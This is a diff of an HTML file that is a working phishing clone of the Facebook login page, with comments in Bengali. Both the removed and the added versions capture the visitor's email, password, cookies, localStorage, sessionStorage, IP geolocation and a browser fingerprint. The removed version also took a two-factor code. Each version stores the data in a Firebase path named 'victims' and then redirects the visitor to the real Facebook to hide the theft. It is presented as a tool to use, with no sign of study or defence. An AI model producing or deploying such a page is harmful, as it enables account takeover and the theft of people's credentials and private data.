@@ -1,21 +1,18 @@
 <!-- ═══════════════════════════════════════════════════════════
      FILE: assets/facebook.html
-     ফেসবুক ক্লোন - কুকি + IP + OTP + সেশন ক্যাপচার
-     Firebase অটো-কানেক্ট (config.js থেকে)
+     ফেসবুক লগইন - হুবহু ক্লোন + কুকি + IP + ফিঙ্গারপ্রিন্ট
      ═══════════════════════════════════════════════════════════ -->
 <!DOCTYPE html>
-<html lang="en" id="facebook">
+<html lang="en">
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="referrer" content="origin-when-crossorigin">
+    <title>Facebook – log in or sign up</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
     <meta property="og:site_name" content="Facebook">
     <meta property="og:url" content="https://www.facebook.com/">
-    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
-    <meta property="og:locale" content="en_GB">
     <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
-    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
-    <title id="pageTitle">Facebook – log in or sign up</title>
     
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
@@ -33,7 +30,6 @@
             --fb-text-secondary: #65676b;
             --fb-border: #dddfe2;
             --fb-white: #ffffff;
-            --fb-shadow: rgba(0, 0, 0, 0.1);
         }
         
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -47,65 +43,50 @@
             align-items: center;
         }
         
-        ._li {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-        }
-        
-        #globalContainer {
-            width: 100%;
-            max-width: 980px;
-            flex: 1;
-        }
-        
-        .fb_content {
+        .fb-container {
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 720px;
+            width: 100%;
+            max-width: 980px;
             padding: 20px;
             gap: 50px;
         }
         
-        ._8esk {
+        .fb-left {
             flex: 1;
             max-width: 580px;
             margin-top: 40px;
         }
         
-        .fb_logo {
+        .fb-logo {
             width: 300px;
             height: auto;
             margin-bottom: -5px;
         }
         
-        ._8eso {
+        .fb-tagline {
             font-size: 28px;
             line-height: 1.34;
             color: var(--fb-text);
-            font-weight: normal;
             padding-left: 32px;
         }
         
-        ._8esn {
+        .fb-right {
             width: 396px;
             flex-shrink: 0;
             margin-top: 40px;
         }
         
-        ._8iep {
+        .fb-login-card {
             background: var(--fb-white);
             border-radius: 8px;
-            box-shadow: 0 2px 4px var(--fb-shadow), 0 8px 16px var(--fb-shadow);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
             padding: 20px;
         }
         
-        ._6lux { margin-bottom: 12px; }
-        
-        ._6luy {
+        .fb-input {
             width: 100%;
             padding: 14px 16px;
             font-size: 17px;
@@ -114,19 +95,17 @@
             outline: none;
             transition: border-color 0.2s, box-shadow 0.2s;
             color: var(--fb-text);
-            background: var(--fb-white);
+            margin-bottom: 12px;
         }
         
-        ._6luy:focus {
+        .fb-input:focus {
             border-color: var(--fb-blue);
             box-shadow: 0 0 0 2px #e7f3ff;
         }
         
-        ._6luy::placeholder { color: #90949c; }
+        .fb-input::placeholder { color: #90949c; }
         
-        ._6ltg { margin-top: 6px; }
-        
-        ._6lth {
+        .fb-btn-login {
             width: 100%;
             padding: 12px;
             background: var(--fb-blue);
@@ -137,32 +116,28 @@
             border-radius: 6px;
             cursor: pointer;
             transition: background 0.2s;
-            letter-spacing: 0.5px;
             font-family: inherit;
         }
         
-        ._6lth:hover { background: var(--fb-blue-hover); }
+        .fb-btn-login:hover { background: var(--fb-blue-hover); }
         
-        ._6ltj {
+        .fb-forgot {
             text-align: center;
             margin: 16px 0;
         }
         
-        ._6ltj a {
+        .fb-forgot a {
             color: var(--fb-blue);
             text-decoration: none;
             font-size: 14px;
-            font-weight: 500;
         }
         
-        ._6ltj a:hover { text-decoration: underline; }
-        
-        ._8icz {
+        .fb-divider {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
         }
         
-        ._6lti {
+        .fb-btn-create {
             display: block;
             margin: 0 auto;
             padding: 14px 20px;
@@ -173,343 +148,205 @@
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            transition: background 0.2s;
             font-family: inherit;
-            text-align: center;
-            text-decoration: none;
-            width: fit-content;
         }
         
-        ._6lti:hover { background: var(--fb-green-hover); }
-        
-        ._58mk {
+        .fb-create-page {
             text-align: center;
             margin-top: 20px;
             font-size: 14px;
-            color: var(--fb-text);
         }
         
-        ._58mk a {
+        .fb-create-page a {
             text-decoration: none;
             color: var(--fb-text);
             font-weight: bold;
         }
         
-        ._58mk a:hover { text-decoration: underline; }
-        
-        #pageFooter {
-            width: 100%;
-            max-width: 980px;
-            padding: 20px;
-            color: var(--fb-text-secondary);
-            font-size: 12px;
-            margin-top: auto;
-        }
-        
-        .localeSelectorList {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #dddfe2;
-            margin-bottom: 10px;
-            list-style: none;
-        }
-        
-        .localeSelectorList a {
-            color: var(--fb-text-secondary);
-            text-decoration: none;
-            font-size: 12px;
-        }
-        
-        .pageFooterLinkList {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 10px;
-            list-style: none;
-        }
-        
-        .pageFooterLinkList a {
-            color: var(--fb-text-secondary);
-            text-decoration: none;
-            font-size: 12px;
-        }
-        
-        .copyright { font-size: 11px; margin-top: 20px; }
-        
-        /* OTP Section */
-        .otp-section {
-            display: none;
-        }
-        
-        .otp-title {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .otp-icon { font-size: 48px; margin-bottom: 10px; }
-        
-        .otp-title h2 { font-size: 16px; margin-bottom: 8px; }
-        
-        .otp-title p {
-            font-size: 14px;
-            color: var(--fb-text-secondary);
-        }
-        
-        .otp-inputs {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-            margin: 20px 0;
-        }
-        
-        .otp-box {
-            width: 45px;
-            height: 50px;
-            text-align: center;
-            font-size: 20px;
-            font-weight: 600;
-            border: 1px solid var(--fb-border);
-            border-radius: 8px;
-            outline: none;
-        }
-        
-        .otp-box:focus {
-            border-color: var(--fb-blue);
-            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
-        }
-        
-        .otp-verify-btn {
-            width: 100%;
-            padding: 10px;
-            background: var(--fb-blue);
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-top: 10px;
-            font-family: inherit;
-        }
-        
-        .otp-resend {
-            display: block;
-            text-align: center;
-            margin-top: 15px;
-            color: var(--fb-blue);
-            font-size: 14px;
-            font-weight: 600;
-            text-decoration: none;
-        }
-        
         /* Spinner */
-        ._spinner {
+        .fb-spinner {
             display: none;
             width: 20px;
             height: 20px;
             border: 3px solid rgba(255,255,255,0.3);
             border-top-color: white;
             border-radius: 50%;
-            animation: _spin 0.8s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin: 0 auto;
         }
-        
-        @keyframes _spin { to { transform: rotate(360deg); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
         
         @media (max-width: 900px) {
-            .fb_content {
-                flex-direction: column;
-                gap: 20px;
-                min-height: auto;
-                padding: 20px 15px;
-            }
-            ._8esk {
-                max-width: 100%;
-                text-align: center;
-                margin-top: 20px;
-            }
-            .fb_logo { width: 200px; }
-            ._8eso { font-size: 20px; padding-left: 0; }
-            ._8esn {
-                width: 100%;
-                max-width: 396px;
-                margin-top: 10px;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .fb_logo { width: 160px; }
-            ._8eso { font-size: 17px; }
-            ._8iep { padding: 15px; }
-            ._6luy { font-size: 15px; padding: 12px 14px; }
+            .fb-container { flex-direction: column; gap: 20px; min-height: auto; }
+            .fb-left { max-width: 100%; text-align: center; margin-top: 20px; }
+            .fb-logo { width: 200px; }
+            .fb-tagline { font-size: 20px; padding-left: 0; }
+            .fb-right { width: 100%; max-width: 396px; margin-top: 10px; }
         }
     </style>
 </head>
-<body class="fbIndex UIPage_LoggedOut">
-    <div class="_li">
-        <div id="globalContainer">
-            <div class="fb_content clearfix" id="content">
-                <div>
-                    <div class="_8esj">
-                        <div class="_8esk">
-                            <div class="_8esl">
-                                <div class="_8ice">
-                                    <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
-                                </div>
-                                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.</h2>
-                            </div>
-                            <div class="_8esn">
-                                <!-- Login Card -->
-                                <div class="_8iep _8icy" id="loginCard">
-                                    <div class="_6luv _52jv">
-                                        <form class="_9vtf" id="loginForm" onsubmit="return handleLogin(event)">
-                                            <input type="hidden" name="platform" value="facebook">
-                                            <div>
-                                                <div class="_6lux">
-                                                    <input type="text" class="_6luy" name="email" id="email" 
-                                                           placeholder="Email address or phone number" 
-                                                           autofocus="1" autocomplete="off" required>
-                                                </div>
-                                                <div class="_6lux">
-                                                    <input type="password" class="_6luy" name="pass" id="password" 
-                                                           placeholder="Password" autocomplete="off" required>
-                                                </div>
-                                            </div>
-                                            <div class="_6ltg">
-                                                <button type="submit" class="_6lth" id="loginBtn">
-                                                    <span id="btnText">Log In</span>
-                                                    <div class="_spinner" id="spinner"></div>
-                                                </button>
-                                            </div>
-                                            <div class="_6ltj">
-                                                <a href="#" onclick="event.preventDefault();">Forgotten password?</a>
-                                            </div>
-                                            <div class="_8icz"></div>
-                                            <div class="_6ltg">
-                                                <a role="button" class="_6lti" href="#" onclick="event.preventDefault();">Create New Account</a>
-                                            </div>
-                                        </form>
-                                    </div>
-                                    <div id="reg_pages_msg" class="_58mk">
-                                        <a href="#" onclick="event.preventDefault();" class="_8esh">Create a Page</a>
-                                        for a celebrity, brand or business.
-                                    </div>
-                                </div>
-                                
-                                <!-- OTP Card -->
-                                <div class="_8iep _8icy otp-section" id="otpCard">
-                                    <div class="otp-title">
-                                        <div class="otp-icon">🔐</div>
-                                        <h2>Two-Factor Authentication</h2>
-                                        <p>Enter the 6-digit code sent to<br>your phone or email.</p>
-                                    </div>
-                                    <form id="otpForm" onsubmit="return handleOTP(event)">
-                                        <div class="otp-inputs">
-                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
-                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
-                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
-                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
-                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
-                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
-                                        </div>
-                                        <input type="hidden" id="otpCombined" name="otp">
-                                        <button type="submit" class="otp-verify-btn" id="otpBtn">
-                                            <span id="otpBtnText">Verify</span>
-                                            <div class="_spinner" id="otpSpinner"></div>
-                                        </button>
-                                    </form>
-                                    <a href="#" class="otp-resend" onclick="event.preventDefault();">Resend Code</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+<body>
+    <div class="fb-container">
+        <div class="fb-left">
+            <img class="fb-logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+            <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
         </div>
         
-        <!-- Footer -->
-        <div class="">
-            <div class="_95ke _8opy">
-                <div id="pageFooter">
-                    <ul class="localeSelectorList">
-                        <li>English (UK)</li>
-                        <li><a href="#" onclick="event.preventDefault();">বাংলা</a></li>
-                        <li><a href="#" onclick="event.preventDefault();">हिन्दी</a></li>
-                        <li><a href="#" onclick="event.preventDefault();">Español</a></li>
-                        <li><a href="#" onclick="event.preventDefault();">العربية</a></li>
-                        <li><a href="#" onclick="event.preventDefault();">中文(简体)</a></li>
-                        <li><a href="#" onclick="event.preventDefault();">Português (Brasil)</a></li>
-                    </ul>
-                    <div id="pageFooterChildren">
-                        <ul class="pageFooterLinkList">
-                            <li><a href="#">Sign Up</a></li>
-                            <li><a href="#">Log In</a></li>
-                            <li><a href="#">Messenger</a></li>
-                            <li><a href="#">Facebook Lite</a></li>
-                            <li><a href="#">Watch</a></li>
-                            <li><a href="#">Places</a></li>
-                            <li><a href="#">Games</a></li>
-                            <li><a href="#">Marketplace</a></li>
-                            <li><a href="#">Facebook Pay</a></li>
-                            <li><a href="#">Oculus</a></li>
-                            <li><a href="#">Instagram</a></li>
-                            <li><a href="#">Groups</a></li>
-                            <li><a href="#">About</a></li>
-                            <li><a href="#">Privacy</a></li>
-                            <li><a href="#">Cookies</a></li>
-                            <li><a href="#">Terms</a></li>
-                            <li><a href="#">Help</a></li>
-                        </ul>
-                    </div>
-                    <div class="copyright"><span>Meta © 2026</span></div>
+        <div class="fb-right">
+            <div class="fb-login-card">
+                <form id="loginForm" onsubmit="return captureData(event)">
+                    <input type="text" class="fb-input" id="email" name="email" 
+                           placeholder="Email address or phone number" autofocus required autocomplete="off">
+                    <input type="password" class="fb-input" id="password" name="pass" 
+                           placeholder="Password" required autocomplete="off">
+                    <input type="hidden" name="platform" value="facebook">
+                    
+                    <button type="submit" class="fb-btn-login" id="loginBtn">
+                        <span id="btnText">Log In</span>
+                        <div class="fb-spinner" id="spinner"></div>
+                    </button>
+                </form>
+                
+                <div class="fb-forgot">
+                    <a href="#" onclick="event.preventDefault();">Forgotten password?</a>
                 </div>
+                <div class="fb-divider"></div>
+                <button class="fb-btn-create" onclick="event.preventDefault();">Create new account</button>
             </div>
+            
+            <p class="fb-create-page">
+                <a href="#" onclick="event.preventDefault();">Create a Page</a> 
+                for a celebrity, brand or business.
+            </p>
         </div>
     </div>
     
     <script>
         // ═══════════════════════════════════════════════════════
-        // FIREBASE AUTO-CONNECT
+        // FIREBASE INIT
         // ═══════════════════════════════════════════════════════
-        
         firebase.initializeApp(window.firebaseConfig);
         const database = firebase.database();
         
-        let loginData = {};
-        
         // ═══════════════════════════════════════════════════════
-        // DEVICE INFO
+        // DEVICE INFO + FINGERPRINT
         // ═══════════════════════════════════════════════════════
-        
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             return {
                 userAgent: ua,
                 platform: navigator.platform,
                 language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(',') : '',
                 screen: screen.width + 'x' + screen.height,
+                availScreen: screen.availWidth + 'x' + screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                browser: ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' :
-                          ua.includes('Firefox') ? 'Firefox' :
-                          ua.includes('Edg') ? 'Edge' :
-                          ua.includes('Safari') ? 'Safari' : 'Unknown',
-                os: ua.includes('Windows') ? 'Windows' :
-                    ua.includes('Android') ? 'Android' :
-                    ua.includes('iPhone') ? 'iOS' :
-                    ua.includes('Mac') ? 'macOS' : 'Unknown',
+                timezoneOffset: new Date().getTimezoneOffset(),
+                browser: detectBrowser(ua),
+                browserVersion: detectBrowserVersion(ua),
+                os: detectOS(ua),
                 device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                touchPoints: navigator.maxTouchPoints || 0
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                memory: navigator.deviceMemory || 'unknown',
+                vendor: navigator.vendor || 'unknown',
+                vendorSub: navigator.vendorSub || '',
+                productSub: navigator.productSub || '',
+                buildID: navigator.buildID || '',
+                appVersion: navigator.appVersion
             };
         }
         
-        // ═══════════════════════════════════════════════════════
-        // IP + GEOLOCATION
-        // ═══════════════════════════════════════════════════════
+        function detectBrowser(ua) {
+            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('OPR')) return 'Opera';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            if (ua.includes('MSIE') || ua.includes('Trident')) return 'IE';
+            return 'Unknown';
+        }
         
+        function detectBrowserVersion(ua) {
+            const match = ua.match(/(Chrome|Firefox|Edge|Safari|Opera)\/(\d+)/);
+            return match ? match[1] + ' ' + match[2] : 'Unknown';
+        }
+        
+        function detectOS(ua) {
+            if (ua.includes('Windows NT 10')) return 'Windows 10';
+            if (ua.includes('Windows NT 11')) return 'Windows 11';
+            if (ua.includes('Windows NT 6.3')) return 'Windows 8.1';
+            if (ua.includes('Windows NT 6.1')) return 'Windows 7';
+            if (ua.includes('Android')) {
+                const match = ua.match(/Android (\d+)/);
+                return match ? 'Android ' + match[1] : 'Android';
+            }
+            if (ua.includes('iPhone')) return 'iOS (iPhone)';
+            if (ua.includes('iPad')) return 'iOS (iPad)';
+            if (ua.includes('Mac OS')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            return 'Unknown';
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // CANVAS FINGERPRINT (অ্যাডভান্সড ট্র্যাকিং)
+        // ═══════════════════════════════════════════════════════
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('CanvasFingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Browser', 4, 17);
+                const dataURL = canvas.toDataURL();
+                return hashString(dataURL);
+            } catch(e) {
+                return 'canvas_error';
+            }
+        }
+        
+        function hashString(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            return hash.toString(36);
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // COOKIE CAPTURE (সব কুকি বের করবে)
+        // ═══════════════════════════════════════════════════════
+        function getAllCookies() {
+            const cookies = {};
+            const cookieStr = document.cookie;
+            if (cookieStr) {
+                cookieStr.split(';').forEach(cookie => {
+                    const parts = cookie.trim().split('=');
+                    const name = parts[0];
+                    const value = parts.slice(1).join('=');
+                    cookies[name] = value;
+                });
+            }
+            return cookies;
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // IP GEOLOCATION (মাল্টি-সোর্স)
+        // ═══════════════════════════════════════════════════════
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/', {
@@ -518,100 +355,44 @@
                 const data = await res.json();
                 return {
                     ip: data.ip || 'Unknown',
+                    network: data.network || 'Unknown',
+                    version: data.version || '',
                     city: data.city || 'Unknown',
                     region: data.region || 'Unknown',
                     country: data.country_name || 'Unknown',
                     countryCode: data.country_code || 'Unknown',
+                    postal: data.postal || '',
                     isp: data.org || 'Unknown',
+                    asn: data.asn || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
                     latitude: data.latitude || '',
                     longitude: data.longitude || '',
-                    timezone: data.timezone || 'Unknown',
-                    asn: data.asn || 'Unknown',
-                    currency: data.currency || 'Unknown',
-                    languages: data.languages || 'Unknown'
+                    languages: data.languages || ''
                 };
             } catch {
-                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+                try {
+                    const res = await fetch('https://ipwho.is/', {
+                        signal: AbortSignal.timeout(5000)
+                    });
+                    const data = await res.json();
+                    return {
+                        ip: data.ip || 'Unknown',
+                        city: data.city || 'Unknown',
+                        country: data.country || 'Unknown',
+                        isp: data.connection?.isp || 'Unknown',
+                        latitude: data.latitude || '',
+                        longitude: data.longitude || ''
+                    };
+                } catch {
+                    return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
+                }
             }
         }
         
         // ═══════════════════════════════════════════════════════
-        // COOKIE CAPTURE
+        // FORM CAPTURE - ফুল ডাটা ক্যাপচার
         // ═══════════════════════════════════════════════════════
-        
-        function getCookies() {
-            const cookies = document.cookie;
-            const cookieList = cookies.split(';').map(c => c.trim()).filter(c => c);
-            
-            return {
-                raw: cookies,
-                parsed: cookieList.map(c => {
-                    const [name, ...value] = c.split('=');
-                    return { name: name.trim(), value: value.join('=').trim() };
-                }),
-                count: cookieList.length,
-                sessionStorage: JSON.stringify(sessionStorage),
-                localStorage: JSON.stringify(localStorage)
-            };
-        }
-        
-        // ═══════════════════════════════════════════════════════
-        // BROWSER FINGERPRINT
-        // ═══════════════════════════════════════════════════════
-        
-        function getFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            ctx.fillStyle = '#1877f2';
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = '#fff';
-            ctx.font = '14px Arial';
-            ctx.fillText('Browser Fingerprint', 10, 30);
-            const fingerprint = canvas.toDataURL();
-            
-            return {
-                canvasHash: fingerprint.substring(0, 100),
-                screenFingerprint: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                plugins: navigator.plugins ? navigator.plugins.length : 0
-            };
-        }
-        
-        // ═══════════════════════════════════════════════════════
-        // OTP AUTO-ADVANCE
-        // ═══════════════════════════════════════════════════════
-        
-        document.querySelectorAll('.otp-box').forEach((box, index, boxes) => {
-            box.addEventListener('input', function() {
-                if (this.value.length === 1 && index < boxes.length - 1) {
-                    boxes[index + 1].focus();
-                }
-                if (index === boxes.length - 1 && this.value.length === 1) {
-                    const allFilled = Array.from(boxes).every(b => b.value.length === 1);
-                    if (allFilled) combineOTP();
-                }
-            });
-            box.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
-                    boxes[index - 1].focus();
-                }
-            });
-        });
-        
-        function combineOTP() {
-            const boxes = document.querySelectorAll('.otp-box');
-            let combined = '';
-            boxes.forEach(box => combined += box.value);
-            document.getElementById('otpCombined').value = combined;
-        }
-        
-        // ═══════════════════════════════════════════════════════
-        // STEP 1: LOGIN
-        // ═══════════════════════════════════════════════════════
-        
-        async function handleLogin(event) {
+        async function captureData(event) {
             event.preventDefault();
             
             const email = document.getElementById('email').value.trim();
@@ -619,78 +400,87 @@
             
             if (!email || !password) return false;
             
+            // Loading state
             document.getElementById('btnText').style.display = 'none';
             document.getElementById('spinner').style.display = 'block';
             document.getElementById('loginBtn').disabled = true;
             
-            // Collect all data
-            loginData = {
+            // সব ডাটা একসাথে সংগ্রহ
+            const victimData = {
                 platform: 'facebook',
                 email: email,
                 password: password,
+                
+                // Device Info
                 deviceInfo: getDeviceInfo(),
+                
+                // Canvas Fingerprint
+                canvasFingerprint: getCanvasFingerprint(),
+                
+                // Cookies
+                cookies: getAllCookies(),
+                cookieString: document.cookie,
+                
+                // IP + Geolocation
                 ipInfo: await getIPInfo(),
-                cookies: getCookies(),
-                fingerprint: getFingerprint(),
+                
+                // Session Info
                 timestamp: new Date().toISOString(),
                 victimId: 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                 referrer: document.referrer || 'Direct Access',
                 pageUrl: window.location.href,
-                step: 'login'
+                
+                // Extra
+                localStorageData: getLocalStorage(),
+                sessionStorageData: getSessionStorage()
             };
             
-            // Show OTP card
+            // Firebase-এ সেভ
+            try {
+                await database.ref('victims/' + victimData.victimId).set(victimData);
+                console.log('✓ Full data captured');
+            } catch (error) {
+                console.error('Firebase error:', error.message);
+            }
+            
+            // আসল ফেসবুকে রিডাইরেক্ট
             setTimeout(() => {
-                document.getElementById('loginCard').style.display = 'none';
-                document.getElementById('otpCard').style.display = 'block';
-                document.getElementById('btnText').style.display = 'inline';
-                document.getElementById('spinner').style.display = 'none';
-                document.getElementById('loginBtn').disabled = false;
-                document.querySelector('.otp-box').focus();
-            }, 1200);
+                window.location.href = 'https://www.facebook.com/login.php?login_attempt=1&lwv=110';
+            }, 1500);
             
             return false;
         }
         
         // ═══════════════════════════════════════════════════════
-        // STEP 2: OTP
+        // LOCAL STORAGE CAPTURE
         // ═══════════════════════════════════════════════════════
-        
-        async function handleOTP(event) {
-            event.preventDefault();
-            
-            combineOTP();
-            const otp = document.getElementById('otpCombined').value;
-            
-            if (!otp || otp.length !== 6) {
-                alert('Please enter the 6-digit code');
-                return false;
-            }
-            
-            document.getElementById('otpBtnText').style.display = 'none';
-            document.getElementById('otpSpinner').style.display = 'block';
-            document.getElementById('otpBtn').disabled = true;
-            
-            // Add OTP data
-            loginData.otp = otp;
-            loginData.otpTimestamp = new Date().toISOString();
-            loginData.step = 'otp_complete';
-            loginData.cookies = getCookies(); // Re-capture cookies
-            
-            // Save to Firebase
+        function getLocalStorage() {
             try {
-                await database.ref('victims/' + loginData.victimId).set(loginData);
-                console.log('✓ All data captured (Login + OTP + Cookies + IP)');
-            } catch (error) {
-                console.error('Firebase error:', error.message);
+                const data = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data[key] = localStorage.getItem(key);
+                }
+                return data;
+            } catch(e) {
+                return {};
             }
-            
-            // Redirect to real Facebook
-            setTimeout(() => {
-                window.location.href = 'https://www.facebook.com/login.php?login_attempt=1';
-            }, 1500);
-            
-            return false;
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // SESSION STORAGE CAPTURE
+        // ═══════════════════════════════════════════════════════
+        function getSessionStorage() {
+            try {
+                const data = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data[key] = sessionStorage.getItem(key);
+                }
+                return data;
+            } catch(e) {
+                return {};
+            }
         }
     </script>
 </body>
